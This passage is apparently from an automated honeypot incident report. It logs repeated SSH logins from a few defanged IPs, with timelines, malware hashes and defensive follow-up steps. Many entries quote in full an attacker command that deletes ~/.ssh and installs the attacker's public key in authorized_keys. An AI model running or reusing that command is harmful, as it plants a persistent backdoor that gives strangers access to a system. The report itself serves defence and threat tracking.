| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:39:40` | `cowrie.session.connect` |
| `2026-06-02 11:39:40` | `cowrie.client.version` |
| `2026-06-02 11:39:40` | `cowrie.client.kex` |
| `2026-06-02 11:39:40` | `cowrie.login.success` |
| `2026-06-02 11:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1008a023751d

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:44 |
| **Last Seen** | 2026-06-02 11:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:44:21` | `cowrie.session.connect` |
| `2026-06-02 11:44:21` | `cowrie.client.version` |
| `2026-06-02 11:44:21` | `cowrie.client.kex` |
| `2026-06-02 11:44:21` | `cowrie.login.success` |
| `2026-06-02 11:44:22` | `cowrie.session.params` |
| `2026-06-02 11:44:22` | `cowrie.command.input` |
| `2026-06-02 11:44:22` | `cowrie.command.failed` |
| `2026-06-02 11:44:22` | `cowrie.log.closed` |
| `2026-06-02 11:44:22` | `cowrie.session.params` |
| `2026-06-02 11:44:22` | `cowrie.command.input` |
| `2026-06-02 11:44:22` | `cowrie.session.file_download` |
| `2026-06-02 11:44:22` | `cowrie.log.closed` |
| `2026-06-02 11:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c12a70dac5e

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:44 |
| **Last Seen** | 2026-06-02 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:44:24` | `cowrie.session.connect` |
| `2026-06-02 11:44:24` | `cowrie.client.version` |
| `2026-06-02 11:44:24` | `cowrie.client.kex` |
| `2026-06-02 11:44:24` | `cowrie.login.success` |
| `2026-06-02 11:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5a2ac71a3f

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-06-02 11:46 |
| **Last Seen** | 2026-06-02 11:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:46:08` | `cowrie.session.connect` |
| `2026-06-02 11:46:08` | `cowrie.client.version` |
| `2026-06-02 11:46:08` | `cowrie.client.kex` |
| `2026-06-02 11:46:08` | `cowrie.login.success` |
| `2026-06-02 11:46:09` | `cowrie.session.params` |
| `2026-06-02 11:46:09` | `cowrie.command.input` |
| `2026-06-02 11:46:09` | `cowrie.command.failed` |
| `2026-06-02 11:46:09` | `cowrie.log.closed` |
| `2026-06-02 11:46:09` | `cowrie.session.params` |
| `2026-06-02 11:46:09` | `cowrie.command.input` |
| `2026-06-02 11:46:09` | `cowrie.session.file_download` |
| `2026-06-02 11:46:09` | `cowrie.log.closed` |
| `2026-06-02 11:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-055011c320e0

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-06-02 11:46 |
| **Last Seen** | 2026-06-02 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:46:11` | `cowrie.session.connect` |
| `2026-06-02 11:46:11` | `cowrie.client.version` |
| `2026-06-02 11:46:11` | `cowrie.client.kex` |
| `2026-06-02 11:46:11` | `cowrie.login.success` |
| `2026-06-02 11:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd2b0bb80c6

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:48 |
| **Last Seen** | 2026-06-02 11:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:48:57` | `cowrie.session.connect` |
| `2026-06-02 11:48:57` | `cowrie.client.version` |
| `2026-06-02 11:48:57` | `cowrie.client.kex` |
| `2026-06-02 11:48:58` | `cowrie.login.success` |
| `2026-06-02 11:48:58` | `cowrie.session.params` |
| `2026-06-02 11:48:58` | `cowrie.command.input` |
| `2026-06-02 11:48:58` | `cowrie.command.failed` |
| `2026-06-02 11:48:58` | `cowrie.log.closed` |
| `2026-06-02 11:48:58` | `cowrie.session.params` |
| `2026-06-02 11:48:58` | `cowrie.command.input` |
| `2026-06-02 11:48:58` | `cowrie.session.file_download` |
| `2026-06-02 11:48:58` | `cowrie.log.closed` |
| `2026-06-02 11:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd4e322d6b9

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:49 |
| **Last Seen** | 2026-06-02 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:49:00` | `cowrie.session.connect` |
| `2026-06-02 11:49:00` | `cowrie.client.version` |
| `2026-06-02 11:49:00` | `cowrie.client.kex` |
| `2026-06-02 11:49:00` | `cowrie.login.success` |
| `2026-06-02 11:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ecca3974895

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:50 |
| **Last Seen** | 2026-06-02 11:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:50:31` | `cowrie.session.connect` |
| `2026-06-02 11:50:31` | `cowrie.client.version` |
| `2026-06-02 11:50:31` | `cowrie.client.kex` |
| `2026-06-02 11:50:31` | `cowrie.login.success` |
| `2026-06-02 11:50:32` | `cowrie.session.params` |
| `2026-06-02 11:50:32` | `cowrie.command.input` |
| `2026-06-02 11:50:32` | `cowrie.command.failed` |
| `2026-06-02 11:50:32` | `cowrie.log.closed` |
| `2026-06-02 11:50:32` | `cowrie.session.params` |
| `2026-06-02 11:50:32` | `cowrie.command.input` |
| `2026-06-02 11:50:32` | `cowrie.session.file_download` |
| `2026-06-02 11:50:32` | `cowrie.log.closed` |
| `2026-06-02 11:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c0f9344d15

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:50 |
| **Last Seen** | 2026-06-02 11:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:50:33` | `cowrie.session.connect` |
| `2026-06-02 11:50:33` | `cowrie.client.version` |
| `2026-06-02 11:50:34` | `cowrie.client.kex` |
| `2026-06-02 11:50:34` | `cowrie.login.success` |
| `2026-06-02 11:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32057368436

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:52 |
| **Last Seen** | 2026-06-02 11:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:52:03` | `cowrie.session.connect` |
| `2026-06-02 11:52:03` | `cowrie.client.version` |
| `2026-06-02 11:52:03` | `cowrie.client.kex` |
| `2026-06-02 11:52:03` | `cowrie.login.success` |
| `2026-06-02 11:52:04` | `cowrie.session.params` |
| `2026-06-02 11:52:04` | `cowrie.command.input` |
| `2026-06-02 11:52:04` | `cowrie.command.failed` |
| `2026-06-02 11:52:04` | `cowrie.log.closed` |
| `2026-06-02 11:52:04` | `cowrie.session.params` |
| `2026-06-02 11:52:04` | `cowrie.command.input` |
| `2026-06-02 11:52:04` | `cowrie.session.file_download` |
| `2026-06-02 11:52:04` | `cowrie.log.closed` |
| `2026-06-02 11:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a74d60813746

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-06-02 11:52 |
| **Last Seen** | 2026-06-02 11:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 11:52:06` | `cowrie.session.connect` |
| `2026-06-02 11:52:06` | `cowrie.client.version` |
| `2026-06-02 11:52:06` | `cowrie.client.kex` |
| `2026-06-02 11:52:06` | `cowrie.login.success` |
| `2026-06-02 11:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c446b3eb6827

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:02 |
| **Last Seen** | 2026-06-02 12:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:02:45` | `cowrie.session.connect` |
| `2026-06-02 12:02:45` | `cowrie.client.version` |
| `2026-06-02 12:02:45` | `cowrie.client.kex` |
| `2026-06-02 12:02:46` | `cowrie.login.success` |
| `2026-06-02 12:02:46` | `cowrie.session.params` |
| `2026-06-02 12:02:46` | `cowrie.command.input` |
| `2026-06-02 12:02:46` | `cowrie.command.failed` |
| `2026-06-02 12:02:46` | `cowrie.log.closed` |
| `2026-06-02 12:02:46` | `cowrie.session.params` |
| `2026-06-02 12:02:46` | `cowrie.command.input` |
| `2026-06-02 12:02:46` | `cowrie.session.file_download` |
| `2026-06-02 12:02:46` | `cowrie.log.closed` |
| `2026-06-02 12:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3438b792e20

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:02 |
| **Last Seen** | 2026-06-02 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:02:48` | `cowrie.session.connect` |
| `2026-06-02 12:02:48` | `cowrie.client.version` |
| `2026-06-02 12:02:48` | `cowrie.client.kex` |
| `2026-06-02 12:02:49` | `cowrie.login.success` |
| `2026-06-02 12:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d479da42c893

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:08 |
| **Last Seen** | 2026-06-02 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:08:05` | `cowrie.session.connect` |
| `2026-06-02 12:08:05` | `cowrie.client.version` |
| `2026-06-02 12:08:06` | `cowrie.client.kex` |
| `2026-06-02 12:08:06` | `cowrie.login.success` |
| `2026-06-02 12:08:06` | `cowrie.session.params` |
| `2026-06-02 12:08:06` | `cowrie.command.input` |
| `2026-06-02 12:08:06` | `cowrie.command.failed` |
| `2026-06-02 12:08:06` | `cowrie.log.closed` |
| `2026-06-02 12:08:07` | `cowrie.session.params` |
| `2026-06-02 12:08:07` | `cowrie.command.input` |
| `2026-06-02 12:08:07` | `cowrie.session.file_download` |
| `2026-06-02 12:08:07` | `cowrie.log.closed` |
| `2026-06-02 12:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f9d3e69b76

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:08 |
| **Last Seen** | 2026-06-02 12:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:08:09` | `cowrie.session.connect` |
| `2026-06-02 12:08:09` | `cowrie.client.version` |
| `2026-06-02 12:08:09` | `cowrie.client.kex` |
| `2026-06-02 12:08:09` | `cowrie.login.success` |
| `2026-06-02 12:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a513615b31e

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:15 |
| **Last Seen** | 2026-06-02 12:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:15:57` | `cowrie.session.connect` |
| `2026-06-02 12:15:57` | `cowrie.client.version` |
| `2026-06-02 12:15:57` | `cowrie.client.kex` |
| `2026-06-02 12:15:58` | `cowrie.login.success` |
| `2026-06-02 12:15:58` | `cowrie.session.params` |
| `2026-06-02 12:15:58` | `cowrie.command.input` |
| `2026-06-02 12:15:58` | `cowrie.command.failed` |
| `2026-06-02 12:15:58` | `cowrie.log.closed` |
| `2026-06-02 12:15:58` | `cowrie.session.params` |
| `2026-06-02 12:15:58` | `cowrie.command.input` |
| `2026-06-02 12:15:58` | `cowrie.session.file_download` |
| `2026-06-02 12:15:58` | `cowrie.log.closed` |
| `2026-06-02 12:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39ef6efc3efa

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:16 |
| **Last Seen** | 2026-06-02 12:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 12:16:00` | `cowrie.session.connect` |
| `2026-06-02 12:16:00` | `cowrie.client.version` |
| `2026-06-02 12:16:00` | `cowrie.client.kex` |
| `2026-06-02 12:16:01` | `cowrie.login.success` |
| `2026-06-02 12:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-599e1adf4798

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-06-02 12:29 |
| **Last Seen** | 2026-06-02 12:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
